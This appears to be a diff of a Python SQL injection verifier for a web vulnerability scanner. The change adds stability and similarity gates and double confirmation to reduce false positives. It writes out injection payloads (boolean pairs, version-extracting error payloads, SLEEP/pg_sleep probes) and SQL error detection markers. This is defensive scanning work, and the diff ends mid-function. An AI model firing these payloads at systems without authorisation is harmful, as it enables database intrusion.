@@ -1,15 +1,56 @@
 """
 SQL Injection Verifier: Active verification for SQL injection vulnerabilities.
 
-Implements:
-- Boolean-based differential testing
-- Error-based detection
-- Time-based blind SQLi
-- UNION-based testing
-- Differential analysis
+Implements four techniques ordered by reliability:
+  1. Boolean-based differential  — sqlmap-style directional check with double confirmation
+  2. Error-based detection       — SQL-engine-specific markers only, absent from baseline
+  3. UNION-based detection       — canary-first; differential paths require 3+ column hits
+  4. Time-based blind            — relative floor, not hardcoded; skipped if server is slow
+
+False-positive philosophy
+--------------------------
+Every technique must pass TWO independent checks before reporting a hit.
+No single-payload, single-check result is ever reported as vulnerable.
+
+Key fixes vs. the previous version
+------------------------------------
+Problem 1  — UNION similarity 0.01 being treated as a hit.
+  Fix       — Hard gate: similarity < 0.10 is a page-transition/error-page, SKIP.
+              This replaces the broken _UNION_SIM_MIN = 0.05 floor which was
+              undercut by ResponseAnalyzer.is_significant_change returning True.
+
+Problem 2  — Version extraction firing on page-transition responses.
+  Fix       — Version extraction is only attempted when the NULL-differential
+              response has similarity IN [0.10, 0.97]. If the NULL probe itself
+              would be skipped, so is the version probe that follows it.
+
+Problem 3  — Stable column-count differential (75 confidence, reproducible=True)
+              firing on non-SQL pages (captcha, exec).
+  Fix       — Minimum 3 payloads in the valid window required (was 2), AND an
+              additional cross-column confirmation probe must pass before
+              is_vulnerable is set True. Single-payload and dual-payload hits
+              are always suppressed.
+
+Problem 4  — login.php username (similarity 0.03) being reported.
+  Fix       — Covered by the 0.10 hard floor above.
+
+Problem 5  — xss_s/txtName sqlite_version() false positive.
+  Fix       — The canary path is now the ONLY path that can set is_vulnerable=True
+              on a page-transition response. Version extraction requires the
+              corresponding NULL probe to have passed the similarity gate first.
+
+Design: canary-first, everything else is circumstantial
+--------------------------------------------------------
+UNION detection hierarchy (confidence order):
+  90 — Canary reflected in response, absent from baseline       (proof of extraction)
+  90 — Version indicator in response, absent from baseline,
+       AND parent NULL probe passed similarity gate             (strong proof)
+  75 — 3+ NULL payloads in valid window, cross-column confirm   (circumstantial but reproducible)
+  suppressed — anything below 3 NULL payloads, or unconfirmed   (not reported)
 """
 
 import asyncio
+import difflib
 import logging
 from typing import Optional
 
@@ -27,6 +68,156 @@ from app.models.vulnerability import OwaspCategory, SeverityLevel
 
 logger = logging.getLogger(__name__)
 
+# ---------------------------------------------------------------------------
+# Confidence thresholds
+# ---------------------------------------------------------------------------
+
+_HIGH_CONFIDENCE_THRESHOLD = 85.0
+
+# ---------------------------------------------------------------------------
+# Boolean differential thresholds (sqlmap-style directional check)
+# ---------------------------------------------------------------------------
+
+# TRUE  response must be >= this similar to baseline (query still returns rows)
+_BOOL_TRUE_MATCH_MIN  = 0.80
+# FALSE response must be <= this similar to baseline (query returns no rows)
+_BOOL_FALSE_MATCH_MAX = 0.60
+
+# ---------------------------------------------------------------------------
+# Page stability
+# ---------------------------------------------------------------------------
+
+# If natural variance between two identical requests exceeds this threshold
+# (i.e., similarity drops below _STABILITY_FLOOR), boolean + UNION are
+# disabled for that parameter.
+_STABILITY_FLOOR = 0.70   # raised from 0.60 — tighter gate
+
+# ---------------------------------------------------------------------------
+# UNION similarity window
+# ---------------------------------------------------------------------------
+
+# Hard floor: below this, the response is a completely different page
+# (error page, redirect-within-200, broken query). This is the primary
+# fix for the 0.01-similarity false positives.
+_UNION_SIM_MIN = 0.10     # raised from 0.05 — the critical fix
+
+# Hard ceiling: above this, the UNION was silently ignored or wrong column count.
+_UNION_SIM_MAX = 0.97
+
+# Minimum number of NULL-count payloads that must fall in the valid window
+# before a differential UNION hit is considered reproducible.
+_UNION_MIN_SIGNIFICANT_PAYLOADS = 3   # raised from 2
+
+# ---------------------------------------------------------------------------
+# SQL-engine-specific error markers
+# Intentionally excludes generic "error", "warning", "invalid input".
+# ---------------------------------------------------------------------------
+
+_SQL_SPECIFIC_MARKERS = frozenset({
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "pg::exception",
+    "postgresql error",
+    "ora-",
+    "oracle error",
+    "sqlite3::exception",
+    "sqlite_error",
+    "supplied argument is not a valid mysql",
+    "mysql_fetch",
+    "mysql_num_rows",
+    "mysql_query",
+    "com.mysql.jdbc",
+    "sqlstate",
+    "sqlexception",
+    "division by zero in",
+    "extractvalue(",
+    "updatexml(",
+    "invalid column name",
+    "sql server",
+    "odbc microsoft access",
+    "jet database engine",
+    "syntax error in query expression",
+})
+
+# Version strings that indicate DB version extraction succeeded.
+# Must be ABSENT from baseline to count.
+_VERSION_INDICATORS = frozenset({
+    "mysql",
+    "mariadb",
+    "postgres",
+    "sqlite",
+    "ubuntu",
+    "debian",
+    "microsoft sql server",
+})
+
+# Boolean injection contexts — (true_payload, false_payload)
+_BOOL_PAYLOAD_PAIRS = [
+    ("' AND '1'='1",     "' AND '1'='2"),
+    ("' AND 1=1--",      "' AND 1=2--"),
+    (" AND 1=1--",       " AND 1=2--"),
+    ("') AND ('1'='1",   "') AND ('1'='2"),
+    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
+    ("' AND 1=1#",       "' AND 1=2#"),
+    ("' AND 1=1/*",      "' AND 1=2/*"),
+]
+
+
+# ---------------------------------------------------------------------------
+# Utility
+# ---------------------------------------------------------------------------
+
+def _body_similarity(a: Optional[str], b: Optional[str]) -> float:
+    """
+    Sequence-matcher similarity between two response bodies.
+    Returns 1.0 for None/empty inputs (treat missing as identical to avoid
+    false volatility signals on probe failures).
+    """
+    a = a or ""
+    b = b or ""
+    if not a and not b:
+        return 1.0
+    return difflib.SequenceMatcher(None, a, b).ratio()
+
+
+def _has_sql_specific_error(text: str) -> bool:
+    """True if text contains at least one SQL-engine-specific error marker."""
+    lowered = text.lower()
+    return any(m in lowered for m in _SQL_SPECIFIC_MARKERS)
+
+
+def _new_sql_errors(baseline_body: str, injected_body: str) -> list[str]:
+    """
+    Return SQL-specific error markers present in injected_body that are
+    absent from baseline_body. The baseline exclusion prevents false positives
+    on pages that already render a SQL error in their normal state.
+    """
+    bl = baseline_body.lower()
+    inj = injected_body.lower()
+    return [m for m in _SQL_SPECIFIC_MARKERS if m in inj and m not in bl]
+
+
+def _new_version_indicators(baseline_body: str, injected_body: str) -> list[str]:
+    """
+    Return version indicators present in injected_body but absent from
+    baseline_body. The baseline exclusion is critical — "mysql" commonly
+    appears in page footers, framework error messages, and help text.
+    """
+    bl = baseline_body.lower()
+    inj = injected_body.lower()
+    return [v for v in _VERSION_INDICATORS if v in inj and v not in bl]
+
+
+def _similarity_in_union_window(sim: float) -> bool:
+    """True if similarity is within the valid UNION differential window."""
+    return _UNION_SIM_MIN <= sim <= _UNION_SIM_MAX
+
+
+# ---------------------------------------------------------------------------
+# Main verifier
+# ---------------------------------------------------------------------------
 
 class SQLiVerifier(BaseVerifier):
     """Verifies SQL injection vulnerabilities through active testing."""
@@ -37,6 +228,10 @@ class SQLiVerifier(BaseVerifier):
         super().__init__(timeout_seconds)
         self.timeout_seconds = timeout_seconds
 
+    # ======================================================================
+    # Public entry point
+    # ======================================================================
+
     async def verify(
         self,
         url: str,
@@ -46,86 +241,169 @@ class SQLiVerifier(BaseVerifier):
         form_inputs: Optional[list] = None,
     ) -> VerificationResult:
         """
-        Execute comprehensive SQL injection verification.
+        Execute SQL injection verification.
 
-        Runs multiple verification techniques:
-        1. Boolean-based differential
-        2. Error-based
-        3. Time-based blind
-        4. UNION-based
-
-        Args:
-            url: Target URL
-            parameter: Parameter name to test
-            method: HTTP method (GET/POST)
-            value: Baseline parameter value
-            form_inputs: Optional list of form input objects for POST forms;
-                         used by FormPayloadBuilder to construct the full body.
-
-        Returns:
-            VerificationResult with highest confidence finding
+        Decision model:
+        1. Fetch baseline.
+        2. Content-type gate: redirects and binary content are skipped entirely.
+           Structured (JSON/XML): differential techniques disabled.
+        3. Stability gate: if the page changes significantly between identical
+           requests, boolean + UNION are disabled (error + time still run).
+        4. Run applicable techniques in order, short-circuit on high confidence.
+        5. Aggregate: return highest-confidence result.
         """
         self._begin_verification(parameter)
-        results = []
+        results: list[VerificationResult] = []
+
+        self._baseline_value = self._resolve_baseline_value(
+            url, parameter, value, form_inputs
+        )
 
         pre_test_baseline = await self.fetch_pre_test_baseline(
-            url, parameter, method, value, form_inputs
+            url, parameter, method, self._baseline_value, form_inputs
         )
 
-        # Try boolean-based first (fastest)
-        bool_result = await self._verify_boolean_based(
-            url, parameter, method, value, form_inputs, pre_test_baseline
-        )
-        if bool_result.is_vulnerable:
-            results.append(bool_result)
+        _run_differential = True
+        _run_error_time   = True
 
-        # Try error-based (quick)
-        error_result = await self._verify_error_based(
-            url, parameter, method, value, form_inputs, pre_test_baseline
-        )
-        if error_result.is_vulnerable:
-            results.append(error_result)
+        # ------------------------------------------------------------------ #
+        # Gate 1: content type                                                #
+        # ------------------------------------------------------------------ #
+        if pre_test_baseline is not None:
+            status = pre_test_baseline.status_code
+            ct = ""
+            if hasattr(pre_test_baseline, "content_type") and pre_test_baseline.content_type:
+                ct = pre_test_baseline.content_type.lower().split(";")[0].strip()
 
-        # Try UNION-based (medium complexity)
-        union_result = await self._verify_union_based(
-            url, parameter, method, value, form_inputs, pre_test_baseline
-        )
-        if union_result.is_vulnerable:
-            results.append(union_result)
+            if status in (301, 302, 303, 307, 308):
+                return VerificationResult(
+                    is_vulnerable=False, confidence_score=0.0,
+                    detection_method="none", findings=[],
+                    evidence={"skipped": "redirect_baseline"},
+                )
 
-        # Try time-based blind (slower, only if others fail)
-        if not results:
-            time_result = await self._verify_time_based(
-                url, parameter, method, value, form_inputs, pre_test_baseline
+            _BINARY_PREFIXES = (
+                "application/octet-stream", "image/", "audio/", "video/",
+                "application/pdf", "application/zip",
             )
-            if time_result.is_vulnerable:
-                results.append(time_result)
+            if any(ct.startswith(b) for b in _BINARY_PREFIXES):
+                return VerificationResult(
+                    is_vulnerable=False, confidence_score=0.0,
+                    detection_method="none", findings=[],
+                    evidence={"skipped": "binary_content_type"},
+                )
 
-        # Return best result or aggregate
+            _STRUCTURED = {
+                "application/json", "application/xml", "text/xml",
+                "application/rss+xml", "application/atom+xml",
+            }
+            if ct in _STRUCTURED:
+                logger.debug(
+                    "SQLi differential disabled for %s:%s — structured content-type (%s)",
+                    url, parameter, ct,
+                )
+                _run_differential = False
+
+        # ------------------------------------------------------------------ #
+        # Gate 2: per-parameter stability                                     #
+        # ------------------------------------------------------------------ #
+        if _run_differential and pre_test_baseline is not None:
+            stability = await self._measure_page_stability(
+                url, parameter, self._baseline_value, method, form_inputs, pre_test_baseline
+            )
+            if stability < _STABILITY_FLOOR:
+                logger.debug(
+                    "SQLi boolean/UNION disabled for %s:%s — page volatile "
+                    "(stability=%.2f < %.2f)",
+                    url, parameter, stability, _STABILITY_FLOOR,
+                )
+                _run_differential = False
+
+        # ------------------------------------------------------------------ #
+        # Technique 1: Boolean differential                                   #
+        # ------------------------------------------------------------------ #
+        if _run_differential:
+            result = await self._verify_boolean_based(
+                url, parameter, method, self._baseline_value, form_inputs, pre_test_baseline
+            )
+            if result.is_vulnerable:
+                results.append(result)
+                if result.confidence_score >= _HIGH_CONFIDENCE_THRESHOLD:
+                    return result
+
+        # ------------------------------------------------------------------ #
+        # Technique 2: Error-based                                            #
+        # ------------------------------------------------------------------ #
+        if _run_error_time:
+            result = await self._verify_error_based(
+                url, parameter, method, self._baseline_value, form_inputs, pre_test_baseline
+            )
+            if result.is_vulnerable:
+                results.append(result)
+                if result.confidence_score >= _HIGH_CONFIDENCE_THRESHOLD:
+                    return result
+
+        # ------------------------------------------------------------------ #
+        # Technique 3: UNION-based                                            #
+        # ------------------------------------------------------------------ #
+        if _run_differential:
+            result = await self._verify_union_based(
+                url, parameter, method, self._baseline_value, form_inputs, pre_test_baseline
+            )
+            if result.is_vulnerable:
+                results.append(result)
+
+        # ------------------------------------------------------------------ #
+        # Technique 4: Time-based (only if no hit yet)                        #
+        # ------------------------------------------------------------------ #
+        if _run_error_time and not results:
+            result = await self._verify_time_based(
+                url, parameter, method, self._baseline_value, form_inputs, pre_test_baseline
+            )
+            if result.is_vulnerable:
+                results.append(result)
+
         if results:
-            # Sort by confidence descending
             results.sort(key=lambda r: r.confidence_score, reverse=True)
             best = results[0]
-
-            # Merge all findings into best result
             for r in results[1:]:
                 best.findings.extend(r.findings)
                 best.evidence.update(r.evidence)
-
             return best
 
-        # No vulnerability found
         return VerificationResult(
-            is_vulnerable=False,
-            confidence_score=0.0,
-            detection_method="none",
-            findings=[],
-            evidence={},
+            is_vulnerable=False, confidence_score=0.0,
+            detection_method="none", findings=[], evidence={},
         )
 
-    # ---------------------------------------------------------------------- #
-    # Helper: Build request arguments respecting form_inputs for POST
-    # ---------------------------------------------------------------------- #
+    # ======================================================================
+    # Helper: resolve baseline value and build HTTP request args
+    # ======================================================================
+
+    def _resolve_baseline_value(
+        self,
+        url: str,
+        parameter: str,
+        value: str,
+        form_inputs: Optional[list],
+    ) -> str:
+        """Use the caller-provided value, then URL query, then form field default."""
+        if value:
+            return value
+
+        from_url = URLParameterBuilder.get_parameter_value(url, parameter)
+        if from_url:
+            return from_url
+
+        if form_inputs:
+            for inp in form_inputs:
+                if getattr(inp, "name", "") == parameter:
+                    field_value = getattr(inp, "value", "") or ""
+                    if field_value:
+                        return field_value
+                    break
+
+        return value
 
     def _build_request_args(
         self,
@@ -134,16 +412,60 @@ class SQLiVerifier(BaseVerifier):
         payload_value: str,
         method: str,
         form_inputs: Optional[list],
+        *,
+        inject: bool = True,
     ) -> tuple[str, Optional[dict], Optional[dict]]:
-        """Return (url, params, data) for an HTTP request.
+        baseline = getattr(self, "_baseline_value", "")
+        if inject:
+            payload_value = f"{baseline}{payload_value}"
 
-        For POST with *form_inputs*, use FormPayloadBuilder to include all
-        sibling fields.  Otherwise fall back to URLParameterBuilder.
-        """
         if method.upper() == "POST" and form_inputs is not None:
             data = FormPayloadBuilder.build(form_inputs, parameter, payload_value)
             return url, None, data
-        return URLParameterBuilder.inject_parameter(url, parameter, payload_value, method, form_inputs=form_inputs)
+
+        return URLParameterBuilder.inject_parameter(
+            url, parameter, payload_value, method, form_inputs=form_inputs
+        )
+
+
+    # ======================================================================
+    # Helper: page stability measurement
+    # ======================================================================
+
+    async def _measure_page_stability(
+        self,
+        url: str,
+        parameter: str,
+        value: str,
+        method: str,
+        form_inputs: Optional[list],
+        pre_test_baseline: ResponseData,
+    ) -> float:
+        """
+        Send one probe with the exact same value as the baseline and measure
+        body similarity. Quantifies natural page variance (CSRF tokens,
+        timestamps, ad scripts) before any injection is attempted.
+
+        Returns similarity in [0.0, 1.0]. Returns 1.0 on failure (assume stable).
+        """
+        try:
+            probe_url, probe_params, probe_data = self._build_request_args(
+                url, parameter, value, method, form_inputs, inject=False
+            )
+            probe_resp = await self._send(
+                probe_url, method, probe_params, probe_data,
+                test_phase="stability_probe",
+            )
+            stability = _body_similarity(pre_test_baseline.body, probe_resp.body)
+            logger.debug("Page stability %s:%s = %.3f", url, parameter, stability)
+            return stability
+        except Exception as e:
+            logger.debug("Stability probe failed %s:%s — assuming stable: %s", url, parameter, e)
+            return 1.0
+
+    # ======================================================================
+    # Technique 1: Boolean-based differential (sqlmap-style)
+    # ======================================================================
 
     async def _verify_boolean_based(
         self,
@@ -155,121 +477,166 @@ class SQLiVerifier(BaseVerifier):
         pre_test_baseline: Optional[ResponseData] = None,
     ) -> VerificationResult:
         """
-        Verify via boolean-based blind SQL injection.
+        Boolean-based blind SQLi using directional similarity checks.
 
-        Compares:
-        - Baseline request
-        - Request with ' AND 1=1--
-        - Request with ' AND 1=2--
-        - Second confirmation pair for reproducibility
+        For each injection context:
+          TRUE  response must be >= 0.80 similar to baseline (rows returned)
+          FALSE response must be <= 0.60 similar to baseline (no rows returned)
+          Status codes must match baseline across all payloads.
+
+        On first passing context, a second independent confirmation pair must
+        also pass before is_vulnerable is set True. Two rounds passing
+        independently is strong evidence against coincidence.
         """
         try:
             baseline = pre_test_baseline or await self.fetch_pre_test_baseline(
                 url, parameter, method, value, form_inputs
             )
 
-            # Get true condition response
-            true_payload = "' AND 1=1--"
-            true_url, true_params, true_data = self._build_request_args(
-                url, parameter, true_payload, method, form_inputs
-            )
-            true_resp = await self._send(
-                true_url, method, true_params, true_data,
-                test_phase="boolean_true", payload=true_payload,
-            )
+            confirmed_true_payload  = None
+            confirmed_false_payload = None
+            confirmed_analysis      = None
+            confirmed_context       = None
 
-            # Get false condition response
-            false_payload = "' AND 1=2--"
-            false_url, false_params, false_data = self._build_request_args(
-                url, parameter, false_payload, method, form_inputs
-            )
-            false_resp = await self._send(
-                false_url, method, false_params, false_data,
-                test_phase="boolean_false", payload=false_payload,
-            )
+            for true_payload, false_payload in _BOOL_PAYLOAD_PAIRS:
 
-            # Analyze
-            is_vulnerable, analysis = ResponseAnalyzer.analyze_boolean_differential(
-                baseline, true_resp, false_resp
-            )
-
-            if is_vulnerable:
-                # Phase 1.3: Second confirmation pair for reproducibility
-                confirm_true_url, confirm_true_params, confirm_true_data = self._build_request_args(
-                    url, parameter, "' AND 2=2--", method, form_inputs
+                true_url, true_params, true_data = self._build_request_args(
+                    url, parameter, true_payload, method, form_inputs
                 )
-                confirm_false_url, confirm_false_params, confirm_false_data = self._build_request_args(
-                    url, parameter, "' AND 2=3--", method, form_inputs
-                )
-                confirm_true_resp = await self._send(
-                    confirm_true_url, method, confirm_true_params, confirm_true_data,
-                    test_phase="boolean_confirm_true", payload="' AND 2=2--",
-                )
-                confirm_false_resp = await self._send(
-                    confirm_false_url, method, confirm_false_params, confirm_false_data,
-                    test_phase="boolean_confirm_false", payload="' AND 2=3--",
-                )
-                confirmed, confirm_analysis = ResponseAnalyzer.analyze_boolean_differential(
-                    baseline, confirm_true_resp, confirm_false_resp
+                true_resp = await self._send(
+                    true_url, method, true_params, true_data,
+                    test_phase="boolean_true", payload=true_payload,
                 )
 
-                # Status-code stability check
-                status_stable = (
-                    true_resp.status_code == baseline.status_code
-                    and false_resp.status_code == baseline.status_code
+                false_url, false_params, false_data = self._build_request_args(
+                    url, parameter, false_payload, method, form_inputs
+                )
+                false_resp = await self._send(
+                    false_url, method, false_params, false_data,
+                    test_phase="boolean_false", payload=false_payload,
                 )
 
-                if confirmed and status_stable:
-                    confidence = 80.0  # HIGH confidence — confirmed with second pair + status stability
-                    finding = self._create_finding(
-                        category=OwaspCategory.a05,
-                        vuln_type="SQL Injection (Boolean-Based Blind)",
-                        severity=SeverityLevel.high,
-                        url=url,
-                        parameter=parameter,
-                        payload=true_payload,
-                        evidence=f"True/false conditions produce different responses (confirmed with second pair). True similarity: {analysis['baseline_similarity_to_true']:.2f}, False similarity: {analysis['baseline_similarity_to_false']:.2f}",
-                        confidence_score=confidence,
-                        detection_method="boolean_differential",
-                        method=method,
-                        detection_evidence={"boolean_analysis": analysis, "confirmation_analysis": confirm_analysis},
-                        reproducible=True,
-                        verified=True,
-                        verification_request_snippet=true_resp.request_snippet,
-                        verification_response_snippet=true_resp.response_snippet,
-                    )
-                    return VerificationResult(
-                        is_vulnerable=True,
-                        confidence_score=confidence,
-                        detection_method="boolean_differential",
-                        findings=[finding],
-                        evidence=analysis,
-                        reproducible=True,
-                    )
-                else:
-                    # First pair matched but confirmation failed — not reproducible
+                _, analysis = ResponseAnalyzer.analyze_boolean_differential(
+                    baseline, true_resp, false_resp
+                )
+                true_sim  = analysis.get("baseline_similarity_to_true",  1.0)
+                false_sim = analysis.get("baseline_similarity_to_false", 1.0)
+
+                if not (true_sim >= _BOOL_TRUE_MATCH_MIN and false_sim <= _BOOL_FALSE_MATCH_MAX):
                     logger.debug(
-                        "Boolean SQLi first pair matched but confirmation failed for %s:%s (confirmed=%s, status_stable=%s)",
-                        url, parameter, confirmed, status_stable,
+                        "Boolean context '%s' failed directional check %s:%s "
+                        "(true_sim=%.2f≥%.2f, false_sim=%.2f≤%.2f)",
+                        true_payload, url, parameter,
+                        true_sim, _BOOL_TRUE_MATCH_MIN, false_sim, _BOOL_FALSE_MATCH_MAX,
                     )
+                    continue
 
+                if (true_resp.status_code != baseline.status_code or
+                        false_resp.status_code != baseline.status_code):
+                    logger.debug(
+                        "Boolean context '%s' status changed %s:%s "
+                        "(baseline=%s, true=%s, false=%s)",
+                        true_payload, url, parameter,
+                        baseline.status_code, true_resp.status_code, false_resp.status_code,
+                    )
+                    continue
+
+                confirmed_true_payload  = true_payload
+                confirmed_false_payload = false_payload
+                confirmed_analysis = {
+                    "baseline_similarity_to_true":  true_sim,
+                    "baseline_similarity_to_false": false_sim,
+                    "context": true_payload,
+                }
+                confirmed_context = true_payload
+                break
+
+            if confirmed_true_payload is None:
+                return VerificationResult(
+                    is_vulnerable=False, confidence_score=0.0,
+                    detection_method="boolean_differential", findings=[],
+                    evidence={"tested_contexts": len(_BOOL_PAYLOAD_PAIRS)},
+                )
+
+            # Second independent pair with substituted values.
+            confirm_true  = confirmed_true_payload.replace("1=1", "3=3").replace("'1'='1", "'x'='x")
+            confirm_false = confirmed_false_payload.replace("1=2", "3=4").replace("'1'='2", "'x'='y")
+
+            ct_url, ct_params, ct_data = self._build_request_args(
+                url, parameter, confirm_true, method, form_inputs
+            )
+            cf_url, cf_params, cf_data = self._build_request_args(
+                url, parameter, confirm_false, method, form_inputs
+            )
+            ct_resp = await self._send(
+                ct_url, method, ct_params, ct_data,
+                test_phase="boolean_confirm_true", payload=confirm_true,
+            )
+            cf_resp = await self._send(
+                cf_url, method, cf_params, cf_data,
+                test_phase="boolean_confirm_false", payload=confirm_false,
+            )
+
+            _, confirm_analysis = ResponseAnalyzer.analyze_boolean_differential(
+                baseline, ct_resp, cf_resp
+            )
+            ct_sim = confirm_analysis.get("baseline_similarity_to_true",  1.0)
+            cf_sim = confirm_analysis.get("baseline_similarity_to_false", 1.0)
+
+            if not (ct_sim >= _BOOL_TRUE_MATCH_MIN and cf_sim <= _BOOL_FALSE_MATCH_MAX):
+                logger.debug(
+                    "Boolean confirmation failed %s:%s (ct_sim=%.2f, cf_sim=%.2f)",
+                    url, parameter, ct_sim, cf_sim,
+                )
+                return VerificationResult(
+                    is_vulnerable=False, confidence_score=0.0,
+                    detection_method="boolean_differential", findings=[],
+                    evidence={
+                        **confirmed_analysis,
+                        "suppressed": "confirmation_failed",
+                        "confirm_true_sim": ct_sim, "confirm_false_sim": cf_sim,
+                    },
+                )
+
+            confidence = 80.0
+            finding = self._create_finding(
+                category=OwaspCategory.a05,
+                vuln_type="SQL Injection (Boolean-Based Blind)",
+                severity=SeverityLevel.high,
+                url=url, parameter=parameter, payload=confirmed_true_payload,
+                evidence=(
+                    f"TRUE payload '{confirmed_true_payload}' → {confirmed_analysis['baseline_similarity_to_true']:.0%} similar to baseline. "
+                    f"FALSE payload '{confirmed_false_payload}' → {confirmed_analysis['baseline_similarity_to_false']:.0%} similar. "
+                    f"Confirmed with independent pair (true_sim={ct_sim:.2f}, false_sim={cf_sim:.2f})."
+                ),
+                confidence_score=confidence, detection_method="boolean_differential",
+                method=method,
+                detection_evidence={
+                    "first_pair": confirmed_analysis,
+                    "confirm_true_sim": ct_sim, "confirm_false_sim": cf_sim,
+                    "injection_context": confirmed_context,
+                },
+                reproducible=True, verified=True,
+                verification_request_snippet=ct_resp.request_snippet,
+                verification_response_snippet=ct_resp.response_snippet,
+            )
             return VerificationResult(
-                is_vulnerable=False,
-                confidence_score=0.0,
-                detection_method="boolean_differential",
-                findings=[],
-                evidence=analysis,
+                is_vulnerable=True, confidence_score=confidence,
+                detection_method="boolean_differential", findings=[finding],
+                evidence=confirmed_analysis, reproducible=True,
             )
 
         except Exception as e:
-            logger.error(f"Boolean-based verification failed for {url}:{parameter}: {e}")
+            logger.error("Boolean verification failed %s:%s: %s", url, parameter, e)
             return VerificationResult(
-                is_vulnerable=False,
-                confidence_score=0.0,
-                detection_method="boolean_differential",
-                findings=[],
+                is_vulnerable=False, confidence_score=0.0,
+                detection_method="boolean_differential", findings=[],
                 evidence={"error": str(e)},
             )
+
+    # ======================================================================
+    # Technique 2: Error-based
+    # ======================================================================
 
     async def _verify_error_based(
         self,
@@ -281,228 +648,112 @@ class SQLiVerifier(BaseVerifier):
         pre_test_baseline: Optional[ResponseData] = None,
     ) -> VerificationResult:
         """
-        Verify via error-based SQL injection.
+        Error-based SQLi detection.
 
-        Sends payloads designed to trigger SQL errors.
+        Only SQL-engine-specific error markers count. The marker must be
+        ABSENT from the baseline to prevent false positives on pages that
+        already display SQL errors in their normal state (admin panels,
+        debug-mode apps, etc.).
+
+        Two independent payloads must both trigger a new SQL-specific error
+        before is_vulnerable is set True. A single-payload error hit is
+        recorded in evidence but not reported as vulnerable.
         """
         error_payloads = [
-            # Generic quote/escape error trigger
             "'",
             "\"",
-            "`)",
-            # MySQL Error-based (XML)
             "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
             "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
-            # PostgreSQL Error-based (cast)
             "' AND CAST((SELECT version())::text AS NUMERIC)--",
-            # MSSQL Error-based (cast)
             "' AND CAST(@@version AS INT)--",
-            # Oracle Error-based (UTL_INADDR)
             "' AND ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--",
-            # SQLite Error-based
             "' AND abs(-9223372036854775808)--",
+            " AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
+            " AND CAST(@@version AS INT)--",
         ]
 
         try:
             baseline = pre_test_baseline or await self.fetch_pre_test_baseline(
                 url, parameter, method, value, form_inputs
             )
-            baseline_errors = ResponseAnalyzer.detect_sql_errors(baseline.body)
+            baseline_body = baseline.body or ""
 
-            # Try error payloads
+            first_hit_payload: Optional[str] = None
+            first_hit_errors:  Optional[list[str]] = None
+            first_hit_resp:    Optional[ResponseData] = None
+
             for payload in error_payloads:
-                injected_url, injected_params, injected_data = self._build_request_args(
+                inj_url, inj_params, inj_data = self._build_request_args(
                     url, parameter, payload, method, form_inputs
                 )
-                injected = await self._send(
-                    injected_url, method, injected_params, injected_data,
+                inj_resp = await self._send(
+                    inj_url, method, inj_params, inj_data,
                     test_phase="error_injection", payload=payload,
                 )
+                inj_body = inj_resp.body or ""
 
-                # Check for SQL errors
-                errors_detected = ResponseAnalyzer.detect_sql_errors(injected.body)
-                new_errors = [e for e in errors_detected if e not in baseline_errors]
+                errors = _new_sql_errors(baseline_body, inj_body)
+                if not errors:
+                    continue
 
-                if new_errors:
-                    confidence = 85.0  # Very high for error-based
-                    finding = self._create_finding(
-                        category=OwaspCategory.a05,
-                        vuln_type="SQL Injection (Error-Based)",
-                        severity=SeverityLevel.critical,
-                        url=url,
-                        parameter=parameter,
-                        payload=payload,
-                        evidence=f"SQL error detected: {', '.join(new_errors)}",
-                        confidence_score=confidence,
-                        detection_method="error_based",
-                        method=method,
-                        detection_evidence={
-                            "errors_detected": new_errors,
-                            "baseline_errors": baseline_errors,
-                            "injected_response_snippet": injected.body[:500],
-                        },
-                        reproducible=True,
-                        verified=True,
-                        verification_request_snippet=injected.request_snippet,
-                        verification_response_snippet=injected.response_snippet,
-                    )
-                    return VerificationResult(
-                        is_vulnerable=True,
-                        confidence_score=confidence,
-                        detection_method="error_based",
-                        findings=[finding],
-                        evidence={"errors": new_errors},
-                        reproducible=True,
-                    )
+                if first_hit_payload is None:
+                    # Record first hit, keep searching for confirmation.
+                    first_hit_payload = payload
+                    first_hit_errors  = errors
+                    first_hit_resp    = inj_resp
+                    continue
 
-            return VerificationResult(
-                is_vulnerable=False,
-                confidence_score=0.0,
-                detection_method="error_based",
-                findings=[],
-                evidence={"baseline_errors": baseline_errors},
-            )
-
-        except Exception as e:
-            logger.error(f"Error-based verification failed for {url}:{parameter}: {e}")
-            return VerificationResult(
-                is_vulnerable=False,
-                confidence_score=0.0,
-                detection_method="error_based",
-                findings=[],
-                evidence={"error": str(e)},
-            )
-
-    async def _verify_time_based(
-        self,
-        url: str,
-        parameter: str,
-        method: str,
-        value: str,
-        form_inputs: Optional[list] = None,
-        pre_test_baseline: Optional[ResponseData] = None,
-    ) -> VerificationResult:
-        """
-        Verify via time-based blind SQL injection.
-
-        Sends payloads with SLEEP/pg_sleep and measures response time.
-        Phase 1.3: Also verifies baseline timing is within normal bounds.
-        """
-        sleep_payloads = [
-            # MySQL sleep
-            ("' AND SLEEP(3)--", 3000),
-            # PostgreSQL sleep
-            ("'; SELECT pg_sleep(3)--", 3000),
-            # MSSQL waitfor
-            ("'; WAITFOR DELAY '0:0:3'--", 3000),
-            # SQLite heavy query timing (benchmark)
-            ("' AND (SELECT 1 FROM (SELECT(SLEEP(3)))x)--", 3000),
-            # Stacked query timing
-            ("'; SELECT SLEEP(3);--", 3000),
-            ("'; pg_sleep(3);--", 3000),
-        ]
-
-        try:
-            baseline_url, baseline_params, baseline_data = self._build_request_args(
-                url, parameter, value, method, form_inputs
-            )
-
-            baseline_times: list[float] = []
-            if pre_test_baseline is not None:
-                baseline_times.append(pre_test_baseline.response_time_ms)
-
-            samples_needed = 3 - len(baseline_times)
-            for _ in range(samples_needed):
-                resp = await self._send(
-                    baseline_url, method, baseline_params, baseline_data, test_phase="time_baseline"
-                )
-                baseline_times.append(resp.response_time_ms)
-                await asyncio.sleep(0.1)  # Small delay between requests
-
-            # Phase 1.3: Verify baseline timing is within normal bounds
-            # If the baseline itself is already very slow (> 2s mean), the server
-            # may be overloaded and timing-based detection is unreliable.
-            baseline_mean = sum(baseline_times) / len(baseline_times) if baseline_times else 0
-            if baseline_mean > 2000:
-                logger.debug(
-                    "Time-based SQLi skipped for %s:%s — baseline too slow (%.0fms mean)",
-                    url, parameter, baseline_mean,
+                # Second independent payload also triggers a new SQL error.
+                # Two independent triggers → confirmed.
